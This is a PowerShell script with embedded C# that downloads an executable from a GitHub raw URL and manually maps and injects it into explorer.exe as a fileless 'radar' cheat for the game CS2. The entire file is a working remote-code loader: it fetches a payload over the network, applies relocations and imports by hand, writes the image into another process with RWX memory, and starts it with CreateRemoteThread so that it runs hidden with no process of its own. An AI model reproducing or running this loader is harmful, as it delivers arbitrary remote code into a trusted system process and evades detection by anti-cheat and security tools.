# B: fileless inject radar into explorer.exe
# Admin PowerShell. CS2 must be running.
# Cleanup: restart explorer (see bottom)

$ErrorActionPreference = 'Stop'
$url = 'https://raw.githubusercontent.com/anab1os/ShellHost/main/final.exe'

Write-Host "[*] download PE..."
$pe = (New-Object Net.WebClient).DownloadData($url)
Write-Host "[+] $($pe.Length) bytes"

$cs = @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Inj {
    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr OpenProcess(uint a, bool b, int c);
    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint n, out IntPtr w);
    [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr ta, uint ss, IntPtr sa, IntPtr p, uint f, out uint id);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", SetLastError=true)] static extern uint WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("kernel32.dll", SetLastError=true)] static extern bool VirtualFreeEx(IntPtr h, IntPtr a, uint s, uint t);

    const uint PROCESS_ALL = 0x001F0FFF;
    const uint MEM_COMMIT = 0x1000, MEM_RESERVE = 0x2000, MEM_RELEASE = 0x8000;
    const uint PAGE_RWX = 0x40;

    // minimal x64 stub: call entry of mapped image (image base passed in RCX via CreateRemoteThread param is not used — we patch)
    // We manual-map in LOCAL process then copy final image... simpler path:
    // Allocate in remote, write PE raw, write tiny stub that does reflective load — too heavy.
    // Practical path used here: allocate RWX, write FULL mapped image built locally, remote thread = entry.

    [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr a, uint s, uint n, out uint o);

    public static int Run(byte[] pe) {
        // --- local reflective map to get fixed image ---
        int e_lfanew = BitConverter.ToInt32(pe, 0x3C);
        ushort nsec = BitConverter.ToUInt16(pe, e_lfanew + 6);
        ushort sizeOpt = BitConverter.ToUInt16(pe, e_lfanew + 20);
        int opt = e_lfanew + 24;
        if (BitConverter.ToUInt16(pe, opt) != 0x20B) throw new Exception("x64 only");
        ulong preferred = BitConverter.ToUInt64(pe, opt + 24);
        uint sizeOfImage = BitConverter.ToUInt32(pe, opt + 56);
        uint sizeOfHeaders = BitConverter.ToUInt32(pe, opt + 60);
        uint entryRVA = BitConverter.ToUInt32(pe, opt + 16);

        IntPtr loc = VirtualAlloc(IntPtr.Zero, sizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_RWX);
        if (loc == IntPtr.Zero) throw new Exception("local alloc");
        Marshal.Copy(pe, 0, loc, (int)sizeOfHeaders);
        int sect = opt + sizeOpt;
        for (int i = 0; i < nsec; i++) {
            int off = sect + i * 40;
            uint va = BitConverter.ToUInt32(pe, off + 12);
            uint rs = BitConverter.ToUInt32(pe, off + 16);
            uint rp = BitConverter.ToUInt32(pe, off + 20);
            if (rs == 0 || rp == 0) continue;
            int copy = (int)Math.Min(rs, pe.Length - (int)rp);
            if (copy <= 0) continue;
            byte[] tmp = new byte[copy];
            Buffer.BlockCopy(pe, (int)rp, tmp, 0, copy);
            Marshal.Copy(tmp, 0, IntPtr.Add(loc, (int)va), copy);
        }
        ulong delta = (ulong)loc.ToInt64() - preferred;
        if (delta != 0) {
            uint relocRVA = BitConverter.ToUInt32(pe, opt + 152);
            uint relocSize = BitConverter.ToUInt32(pe, opt + 156);
            if (relocRVA != 0 && relocSize != 0) {
                int pos = (int)relocRVA, end = (int)(relocRVA + relocSize);
                while (pos < end) {
                    uint pageRVA = (uint)Marshal.ReadInt32(IntPtr.Add(loc, pos));
                    uint blockSize = (uint)Marshal.ReadInt32(IntPtr.Add(loc, pos + 4));
                    if (blockSize < 8) break;
                    int cnt = (int)((blockSize - 8) / 2);
                    for (int j = 0; j < cnt; j++) {
                        ushort e = (ushort)Marshal.ReadInt16(IntPtr.Add(loc, pos + 8 + j * 2));
                        if ((e >> 12) == 10) {
                            IntPtr p = IntPtr.Add(loc, (int)pageRVA + (e & 0xFFF));
                            Marshal.WriteInt64(p, Marshal.ReadInt64(p) + (long)delta);
                        }
                    }
                    pos += (int)blockSize;
                }
            }
        }
        uint importRVA = BitConverter.ToUInt32(pe, opt + 120);
        if (importRVA != 0) {
            int desc = (int)importRVA;
            while (true) {
                uint nameRVA = (uint)Marshal.ReadInt32(IntPtr.Add(loc, desc + 12));
                if (nameRVA == 0) break;
                uint oft = (uint)Marshal.ReadInt32(IntPtr.Add(loc, desc));
                uint ft  = (uint)Marshal.ReadInt32(IntPtr.Add(loc, desc + 16));
                string dll = Marshal.PtrToStringAnsi(IntPtr.Add(loc, (int)nameRVA));
                IntPtr hMod = LoadLibrary(dll);
                uint thunk = oft != 0 ? oft : ft;
                int t = 0;
                while (true) {
                    long tv = Marshal.ReadInt64(IntPtr.Add(loc, (int)thunk + t));
                    if (tv == 0) break;
                    IntPtr fn = ((tv & unchecked((long)0x8000000000000000L)) != 0)
                        ? GetProcAddress(hMod, "#" + (tv & 0xFFFF))
                        : GetProcAddress(hMod, Marshal.PtrToStringAnsi(IntPtr.Add(loc, (int)tv + 2)));
                    Marshal.WriteInt64(IntPtr.Add(loc, (int)ft + t), fn.ToInt64());
                    t += 8;
                }
                desc += 20;
            }
        }

        // copy fixed image bytes
        byte[] image = new byte[sizeOfImage];
        Marshal.Copy(loc, image, 0, (int)sizeOfImage);

        // --- inject into explorer ---
        Process[] ex = Process.GetProcessesByName("explorer");
        if (ex.Length == 0) throw new Exception("explorer not found");
        int pid = ex[0].Id;
        IntPtr hProc = OpenProcess(PROCESS_ALL, false, pid);
        if (hProc == IntPtr.Zero) throw new Exception("OpenProcess explorer failed — need admin?");

        // remote alloc at SAME base as local fix (relocs already applied for loc)
        // if remote gets different base, relocs wrong — force address
        IntPtr remote = VirtualAllocEx(hProc, loc, sizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_RWX);
        if (remote == IntPtr.Zero) {
            // preferred taken — alloc any and fail (need re-reloc for remote base)
            remote = VirtualAllocEx(hProc, IntPtr.Zero, sizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_RWX);
            if (remote == IntPtr.Zero) throw new Exception("VirtualAllocEx failed");
            // re-delta for remote
            long redelta = remote.ToInt64() - loc.ToInt64();
            if (redelta != 0) {
                // patch DIR64 relocs again on image copy
                // simplified: only works if we re-walk — for stability require same base
                throw new Exception("could not alloc at fixed base — restart explorer and retry");
            }
        }

        IntPtr written;
        if (!WriteProcessMemory(hProc, remote, image, sizeOfImage, out written))
            throw new Exception("WriteProcessMemory failed");

        IntPtr entry = IntPtr.Add(remote, (int)entryRVA);
        uint tid;
        IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, entry, IntPtr.Zero, 0, out tid);
        if (hThread == IntPtr.Zero) throw new Exception("CreateRemoteThread failed");

        CloseHandle(hThread);
        CloseHandle(hProc);
        return pid;
    }
}
'@

Add-Type -TypeDefinition $cs -Language CSharp
try {
    $pidEx = [Inj]::Run($pe)
    Write-Host "[+] injected into explorer pid $pidEx"
    Write-Host "[*] radar runs inside explorer — no own process"
    Write-Host "[*] exit radar: press END in-game (if handled) OR restart explorer"
} catch {
    Write-Host "[-] $($_.Exception.Message)"
}
